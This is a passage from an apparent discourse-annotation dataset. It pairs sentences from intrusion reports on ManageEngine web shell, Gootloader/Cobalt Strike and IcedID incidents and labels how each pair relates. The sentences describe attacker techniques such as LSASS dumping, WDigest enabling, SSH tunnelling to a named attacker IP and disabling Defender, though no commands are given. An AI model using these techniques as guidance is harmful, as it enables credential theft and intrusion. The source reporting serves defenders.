        "S1": "More on the dumping method in the Credential Access section.",
        "S2": "During the initial access, an attacker uploaded a binary named msiexec.exe onto the system.",
        "relation": "MISC"
    },
    {
        "S1": "During the initial access, an attacker uploaded a binary named msiexec.exe onto the system.",
        "S2": "This binary isn\u2019t the legitimate Microsoft msiexec.exe, rather it is a dropper that contains an embedded encoded web shell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This binary isn\u2019t the legitimate Microsoft msiexec.exe, rather it is a dropper that contains an embedded encoded web shell.",
        "S2": "The naming of this executable has the benefit of blending into the environment and appearing legitimate, while also being critical to the exploitation of CVE-2021-44077.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The naming of this executable has the benefit of blending into the environment and appearing legitimate, while also being critical to the exploitation of CVE-2021-44077.",
        "S2": "During a later stage of the intrusion, an attacker dumped the LSASS process (see Credential Access section).",
        "relation": "NEXT"
    },
    {
        "S1": "During a later stage of the intrusion, an attacker dumped the LSASS process (see Credential Access section).",
        "S2": "After exfiltrating the LSASS dump, the attacker deleted the dump file to hide their traces.",
        "relation": "NEXT"
    },
    {
        "S1": "After exfiltrating the LSASS dump, the attacker deleted the dump file to hide their traces.",
        "S2": "Once the credentials were harvested from the LSASS dump, the threat actor returned to the environment and downloaded the binary named ekern.exe to tunnel RDP connections over SSH.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the credentials were harvested from the LSASS dump, the threat actor returned to the environment and downloaded the binary named ekern.exe to tunnel RDP connections over SSH.",
        "S2": "Ekern.exe is the plink.exe tool renamed in order to stay under the radar.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ekern.exe is the plink.exe tool renamed in order to stay under the radar.",
        "S2": "Furthermore, the name ekern.exe is similar to the name of a known component of ESET named ekrn.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Furthermore, the name ekern.exe is similar to the name of a known component of ESET named ekrn.exe.",
        "S2": "On the beachhead system, the threat actor queried the registry checking to see if WDigest was enabled:",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead system, the threat actor queried the registry checking to see if WDigest was enabled:",
        "S2": "WDigest allows for credential caching in LSASS which will result in a users plaintext password being stored in memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "WDigest allows for credential caching in LSASS which will result in a users plaintext password being stored in memory.",
        "S2": "The intended purpose of WDigest credential caching is to facilitate clear text authentication with HTTP and SASL, however, this can be misused by the threat actor to retrieve the plaintext credentials of a user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The intended purpose of WDigest credential caching is to facilitate clear text authentication with HTTP and SASL, however, this can be misused by the threat actor to retrieve the plaintext credentials of a user.",
        "S2": "Here\u2019s the command executed from the web shell:",
        "relation": "MISC"
    },
    {
        "S1": "Here\u2019s the command executed from the web shell:",
        "S2": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
        "S2": "Twenty-two seconds later, the threat actor enabled WDigest using the following command, via the web shell:",
        "relation": "NEXT"
    },
    {
        "S1": "Twenty-two seconds later, the threat actor enabled WDigest using the following command, via the web shell:",
        "S2": "After enabling WDigest, the attacker checked back numerous times over multiple days to see who was signed in.",
        "relation": "NEXT"
    },
    {
        "S1": "After enabling WDigest, the attacker checked back numerous times over multiple days to see who was signed in.",
        "S2": "During this period, a privileged user logged onto the system for maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During this period, a privileged user logged onto the system for maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll.",
        "S2": "The threat actor listed the running processes via the tasklist command and used the PID of LSASS from the output to pass to the credential dumping command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor listed the running processes via the tasklist command and used the PID of LSASS from the output to pass to the credential dumping command.",
        "S2": "The LSASS dump was then exfiltrated out of the environment for offline analysis and rest of the actions were conducted from the account whose password was extracted from the LSASS dump.",
        "relation": "NEXT"
    },
    {
        "S1": "The LSASS dump was then exfiltrated out of the environment for offline analysis and rest of the actions were conducted from the account whose password was extracted from the LSASS dump.",
        "S2": "The threat actor used the web shell fm2.jsp to conduct their initial discovery on the host.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor used the web shell fm2.jsp to conduct their initial discovery on the host.",
        "S2": "Below are the GET requests sent to the web shell with the discovery commands passed to the cmd parameter, which runs as PowerShell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below are the GET requests sent to the web shell with the discovery commands passed to the cmd parameter, which runs as PowerShell.",
        "S2": "They also used the web shell to review directories, here\u2019s a few examples",
        "relation": "ELABORATION"
    },
    {
        "S1": "They also used the web shell to review directories, here\u2019s a few examples",
        "S2": "The threat actor used the web shell to download file.exe onto the beachhead and save it as ekern.exe using a PowerShell download cradle.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor used the web shell to download file.exe onto the beachhead and save it as ekern.exe using a PowerShell download cradle.",
        "S2": "The file ekern.exe was a renamed copy of Plink.exe, a command-line SSH client.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The file ekern.exe was a renamed copy of Plink.exe, a command-line SSH client.",
        "S2": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "S2": "Let\u2019s break down what this command means:",
        "relation": "MISC"
    },
    {
        "S1": "Let\u2019s break down what this command means:",
        "S2": "Providing \u201cy\u201d as standard input to the executable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Providing \u201cy\u201d as standard input to the executable.",
        "S2": "To confirm when plink asks if they would like the public key added to known hosts.",
        "relation": "MISC"
    },
    {
        "S1": "To confirm when plink asks if they would like the public key added to known hosts.",
        "S2": "Plink executable",
        "relation": "ELABORATION"
    },
    {
        "S1": "Plink executable",
        "S2": "Force the use of SSH (Plink can support other protocols)",
        "relation": "MISC"
    },
    {
        "S1": "Force the use of SSH (Plink can support other protocols)",
        "S2": "Define a specific target port for SSH connection",
        "relation": "NEXT"
    },
    {
        "S1": "Define a specific target port for SSH connection",
        "S2": "Connect with the specified username",
        "relation": "NEXT"
    },
    {
        "S1": "Connect with the specified username",
        "S2": "Password to authenticate with",
        "relation": "NEXT"
    },
    {
        "S1": "Password to authenticate with",
        "S2": "Listen on 23.81.246.84:49800 and forward it to 127.0.0.1:3389.",
        "relation": "NEXT"
    },
    {
        "S1": "Listen on 23.81.246.84:49800 and forward it to 127.0.0.1:3389.",
        "S2": "This effectively proxies the request to the host running the command",
        "relation": "ELABORATION"
    },
    {
        "S1": "This effectively proxies the request to the host running the command",
        "S2": "Target server to SSH",
        "relation": "MISC"
    },
    {
        "S1": "Target server to SSH",
        "S2": "The actor defined a custom target port to Plink (-P 443) instead of the default SSH port of 22.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actor defined a custom target port to Plink (-P 443) instead of the default SSH port of 22.",
        "S2": "The actor used the technique of port forwarding to listen on the remote port, 23.81.246[.]84:49800, and forward the requests to 127.0.0.1:3389.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actor used the technique of port forwarding to listen on the remote port, 23.81.246[.]84:49800, and forward the requests to 127.0.0.1:3389.",
        "S2": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
        "relation": "NEXT"
    },
    {
        "S1": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
        "S2": "The script FXS.bat was re",
        "relation": "MISC"
    },
    {
        "S1": "The script FXS.bat was re",
        "S2": "-used multiple times to establish connections to various hosts.",
        "relation": "MISC"
    },
    {
        "S1": "-used multiple times to establish connections to various hosts.",
        "S2": "The actor then replaced the loopback address with various internal hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor then replaced the loopback address with various internal hosts.",
        "S2": "The ManageEngine server acted as a proxy that forwarded the RDP traffic between the target host and the threat actor\u2019s server:",
        "relation": "MISC"
    },
    {
        "S1": "The ManageEngine server acted as a proxy that forwarded the RDP traffic between the target host and the threat actor\u2019s server:",
        "S2": "All command and control traffic we observed was through the SSH tunnel to 23.81.246.84.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All command and control traffic we observed was through the SSH tunnel to 23.81.246.84.",
        "S2": "That IP address was exposing an SSH server on port 443 which was what the beachhead made connections with.",
        "relation": "ELABORATION"
    },
    {
        "S1": "That IP address was exposing an SSH server on port 443 which was what the beachhead made connections with.",
        "S2": "The headers of 23.81.246.84:433 reported the threat actor was using a Bitvise SSH Server:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The headers of 23.81.246.84:433 reported the threat actor was using a Bitvise SSH Server:",
        "S2": "After getting a foothold on the beachhead machine, an attacker first downloaded the postgres DB backup of the ManageEngine SupportCenter Plus application using the web shell.",
        "relation": "MISC"
    },
    {
        "S1": "After getting a foothold on the beachhead machine, an attacker first downloaded the postgres DB backup of the ManageEngine SupportCenter Plus application using the web shell.",
        "S2": "Seven days after initial access, an attacker exfiltrated a certificate from the server, a Visio file, and an excel sheet for the accounts via web shell:",
        "relation": "NEXT"
    },
    {
        "S1": "Seven days after initial access, an attacker exfiltrated a certificate from the server, a Visio file, and an excel sheet for the accounts via web shell:",
        "S2": "Server certificate downloaded via web shell:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Server certificate downloaded via web shell:",
        "S2": "Visio file downloaded via web shell:",
        "relation": "LIST"
    },
    {
        "S1": "Visio file downloaded via web shell:",
        "S2": "Excel file downloaded via web shell:",
        "relation": "LIST"
    },
    {
        "S1": "Excel file downloaded via web shell:",
        "S2": "An attacker was also seen exfiltrating confidential documents during a RDP session and triggering canary tokens from 192.221.154.141 and 8.0.26.137 upon opening the documents.",
        "relation": "NEXT"
    },
    {
        "S1": "An attacker was also seen exfiltrating confidential documents during a RDP session and triggering canary tokens from 192.221.154.141 and 8.0.26.137 upon opening the documents.",
        "S2": "Impact",
        "relation": "MISC"
    },
    {
        "S1": "Impact",
        "S2": "The threat actors were evicted from the network soon after stealing confidential information.",
        "relation": "MISC"
    },
    {
        "S1": "The intrusion started with a user searching Bing for \u201cOlymplus Plea Agreement?\u201d.",
        "S2": "The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section).",
        "relation": "NEXT"
    },
    {
        "S1": "The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section).",
        "S2": "Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.",
        "S2": "Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network.",
        "S2": "The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.",
        "S2": "After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server.",
        "relation": "NEXT"
    },
    {
        "S1": "After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server.",
        "S2": "Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation.",
        "relation": "NEXT"
    },
    {
        "S1": "Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation.",
        "S2": "Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.",
        "S2": "With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host.",
        "relation": "NEXT"
    },
    {
        "S1": "With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host.",
        "S2": "They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.",
        "S2": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion.",
        "S2": "After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.",
        "S2": "The threat actors then used Lazagne again on the domain controller to extract more credentials.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then used Lazagne again on the domain controller to extract more credentials.",
        "S2": "Our evidence shows that the attackers then began looking for interesting documents on file shares.",
        "relation": "NEXT"
    },
    {
        "S1": "Our evidence shows that the attackers then began looking for interesting documents on file shares.",
        "S2": "They opened the documents one-by-one on the remote host via RDP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They opened the documents one-by-one on the remote host via RDP.",
        "S2": "They directed their focus to documents with legal and insurance-related content.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They directed their focus to documents with legal and insurance-related content.",
        "S2": "On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session.",
        "relation": "NEXT"
    },
    {
        "S1": "On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session.",
        "S2": "Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.",
        "S2": "The threat actor gained initial access using Gootloader malware.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained initial access using Gootloader malware.",
        "S2": "Here\u2019s a video of the user searching and downloading the malware via the poisoned SEO search.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s a video of the user searching and downloading the malware via the poisoned SEO search.",
        "S2": "The Javascript file is then executed when double clicked after the zip is opened.",
        "relation": "NEXT"
    },
    {
        "S1": "The Javascript file is then executed when double clicked after the zip is opened.",
        "S2": "Gootloader upon execution creates two registry keys:",
        "relation": "MISC"
    },
    {
        "S1": "Gootloader upon execution creates two registry keys:",
        "S2": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.",
        "S2": "Following the Registry events, a PowerShell command was launched executing an encoded command.",
        "relation": "MISC"
    },
    {
        "S1": "Following the Registry events, a PowerShell command was launched executing an encoded command.",
        "S2": "The PowerShell command will extract the .NET loader from HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via `Assembly.Load()`.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PowerShell command will extract the .NET loader from HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via `Assembly.Load()`.",
        "S2": "This CyberChef recipe can be used to decode the related PS encoded payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This CyberChef recipe can be used to decode the related PS encoded payload.",
        "S2": "Once the PowerShell script is finished running, the next stage involves the .NET loader.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the PowerShell script is finished running, the next stage involves the .NET loader.",
        "S2": "The .NET loader will read HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the encoded Cobalt Strike payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The .NET loader will read HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the encoded Cobalt Strike payload.",
        "S2": "This payload will be decoded and subsequently loaded into memory for execution.",
        "relation": "NEXT"
    },
    {
        "S1": "This payload will be decoded and subsequently loaded into memory for execution.",
        "S2": "A simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.",
        "relation": "MISC"
    },
    {
        "S1": "A simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.",
        "S2": "The following shows the source code responsible for the core logic of the .NET loader.",
        "relation": "MISC"
    },
    {
        "S1": "The following shows the source code responsible for the core logic of the .NET loader.",
        "S2": "The below diagram summarizes the Gootloader initial execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The below diagram summarizes the Gootloader initial execution.",
        "S2": "An excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop .js files from executing, preventing this attack chain from ever getting off the ground.",
        "relation": "MISC"
    },
    {
        "S1": "An excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop .js files from executing, preventing this attack chain from ever getting off the ground.",
        "S2": "During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.",
        "relation": "MISC"
    },
    {
        "S1": "During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.",
        "S2": "The Javascript (Gootloader) file invoked an encoded PowerShell command.",
        "relation": "MISC"
    },
    {
        "S1": "The Javascript (Gootloader) file invoked an encoded PowerShell command.",
        "S2": "The task created from the PowerShell script:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The task created from the PowerShell script:",
        "S2": "Windows Defender scheduled scans were deleted from the system.",
        "relation": "NEXT"
    },
    {
        "S1": "Windows Defender scheduled scans were deleted from the system.",
        "S2": "This was observed on multiple servers the threat actor pivoted to.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was observed on multiple servers the threat actor pivoted to.",
        "S2": "Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.",
        "relation": "MISC"
    },
    {
        "S1": "Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.",
        "S2": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
        "S2": "This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.",
        "S2": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "S2": "The threat actors were observed making use of double encoded Powershell commands.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were observed making use of double encoded Powershell commands.",
        "S2": "The first layer of encoding contains Hexadecimal and XOR encoding.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first layer of encoding contains Hexadecimal and XOR encoding.",
        "S2": "The second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.",
        "relation": "LIST"
    },
    {
        "S1": "The second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.",
        "S2": "Decoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.",
        "relation": "NEXT"
    },
    {
        "S1": "Decoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.",
        "S2": "The malicious PowerShell process used by Gootloader dropped a PowerShell script named \u201cmi.ps1\u201d on the file system.",
        "relation": "MISC"
    },
    {
        "S1": "The malicious PowerShell process used by Gootloader dropped a PowerShell script named \u201cmi.ps1\u201d on the file system.",
        "S2": "Another PowerShell command was used to trigger the mi.ps1 script.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Another PowerShell command was used to trigger the mi.ps1 script.",
        "S2": "The script was using XOR-encoding.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The script was using XOR-encoding.",
        "S2": "This CyberChef recipe can be used to decode the inner encoded command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This CyberChef recipe can be used to decode the inner encoded command.",
        "S2": "The output lists \u201cInvoke-Mimikatz\u201d, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The output lists \u201cInvoke-Mimikatz\u201d, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.",
        "S2": "In addition, the post-exploitation tool \u201cLaZagne\u201d (renamed to ls.exe)",
        "relation": "LIST"
    },
    {
        "S1": "In addition, the post-exploitation tool \u201cLaZagne\u201d (renamed to ls.exe)",
        "S2": "was used with the \u201c-all\u201d switch.",
        "relation": "ELABORATION"
    },
    {
        "S1": "was used with the \u201c-all\u201d switch.",
        "S2": "This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the \u201cC:\\Users\u201d directory.",
        "relation": "MISC"
    },
    {
        "S1": "This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the \u201cC:\\Users\u201d directory.",
        "S2": "When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.",
        "S2": "Here\u2019s the commands from another system:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s the commands from another system:",
        "S2": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain.",
        "S2": "The Cobalt Strike beacon was used to invoke the PowerShell script.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacon was used to invoke the PowerShell script.",
        "S2": "They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.",
        "S2": "The threat actors executed this command remotely on a domain controller, before moving laterally to it:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors executed this command remotely on a domain controller, before moving laterally to it:",
        "S2": "While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.",
        "relation": "MISC"
    },
    {
        "S1": "While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.",
        "S2": "On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:",
        "relation": "NEXT"
    },
    {
        "S1": "On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:",
        "S2": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "S2": "This method was used to pivot to other systems within the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This method was used to pivot to other systems within the network.",
        "S2": "SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.",
        "S2": "These executables were then executed by a remote service visible in the windows event id 7045 logs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These executables were then executed by a remote service visible in the windows event id 7045 logs.",
        "S2": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network.",
        "relation": "MISC"
    },
    {
        "S1": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network.",
        "S2": "One important aspect of these sessions is that the threat actor authenticated using \u201cRestricted Admin Mode\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One important aspect of these sessions is that the threat actor authenticated using \u201cRestricted Admin Mode\u201d.",
        "S2": "Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP.",
        "S2": "In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.",
        "S2": "The threat actor attempted to use both Invoke-WMIExec and psexec to enable \u201cRestricted Admin Mode\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor attempted to use both Invoke-WMIExec and psexec to enable \u201cRestricted Admin Mode\u201d.",
        "S2": "The logon information of EventID 4624 includes a field \u201cRestricted Admin Mode\u201d, which is set to the value \u201cYes\u201d if the feature is used.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The logon information of EventID 4624 includes a field \u201cRestricted Admin Mode\u201d, which is set to the value \u201cYes\u201d if the feature is used.",
        "S2": "The threat actor accessed multiple files during the RDP sessions on multiple servers.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor accessed multiple files during the RDP sessions on multiple servers.",
        "S2": "In one instance document files were opened directly on the system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In one instance document files were opened directly on the system.",
        "S2": "Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.",
        "S2": "Gootloader second stage download URLs.",
        "relation": "MISC"
    },
    {
        "S1": "Gootloader second stage download URLs.",
        "S2": "These URLs were deobfuscated and extracted using this script by HP Threat Research.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These URLs were deobfuscated and extracted using this script by HP Threat Research.",
        "S2": "They\u2019ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They\u2019ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.",
        "S2": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor was able to enter the network when a user endpoint was compromised by an IcedID payload contained within an ISO image.",
        "S2": "We have high confidence this payload was delivered via email, however we were not able to identify the delivery email.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have high confidence this payload was delivered via email, however we were not able to identify the delivery email.",
        "S2": "The ISO contained a DLL file (IcedID malware) and a LNK shortcut to execute it.",
        "relation": "NEXT"
    },
    {
        "S1": "The ISO contained a DLL file (IcedID malware) and a LNK shortcut to execute it.",
        "S2": "The end user after clicking into the ISO file, could see just a single file named \u201cdocument\u201d, which is a LNK shortcut to a hidden DLL packaged in the ISO.",
        "relation": "NEXT"
    },
    {
        "S1": "The end user after clicking into the ISO file, could see just a single file named \u201cdocument\u201d, which is a LNK shortcut to a hidden DLL packaged in the ISO.",
        "S2": "When the user clicks on the LNK file, the IcedID DLL is executed.",
        "relation": "NEXT"
    },
    {
        "S1": "When the user clicks on the LNK file, the IcedID DLL is executed.",
        "S2": "Upon this execution of the IcedID DLL, a battery of discovery tasks were executed using built-in Windows utilities like ipconfig, systeminfo, nltest, net, and chcp.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon this execution of the IcedID DLL, a battery of discovery tasks were executed using built-in Windows utilities like ipconfig, systeminfo, nltest, net, and chcp.",
        "S2": "The IcedID malware also created a scheduled task as a means of persistence on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "The IcedID malware also created a scheduled task as a means of persistence on the beachhead host.",
        "S2": "Around two hours later, Cobalt Strike was deployed using process hollowing and injection techniques.",
        "relation": "NEXT"
    },
    {
        "S1": "Around two hours later, Cobalt Strike was deployed using process hollowing and injection techniques.",
        "S2": "This marked the start of \u201chands-on-keyboard\u201d activity by the threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This marked the start of \u201chands-on-keyboard\u201d activity by the threat actors.",
        "S2": "This activity included using AdFind through a batch script called adfind.bat to perform discovery of the target organizations active directory structure.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity included using AdFind through a batch script called adfind.bat to perform discovery of the target organizations active directory structure.",
        "S2": "The threat actors gathered host based network information by running a batch script named ns.bat , which ran nslookup for each host in the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors gathered host based network information by running a batch script named ns.bat , which ran nslookup for each host in the environment.",
        "S2": "The Cobalt Strike process then proceeded to access LSASS memory to extract credentials, which a few minutes later were tested to run remote WMI discovery tasks on a server.",
        "relation": "NEXT"
    },
    {
        "S1": "The Cobalt Strike process then proceeded to access LSASS memory to extract credentials, which a few minutes later were tested to run remote WMI discovery tasks on a server.",
        "S2": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
        "relation": "NEXT"
    },
    {
        "S1": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
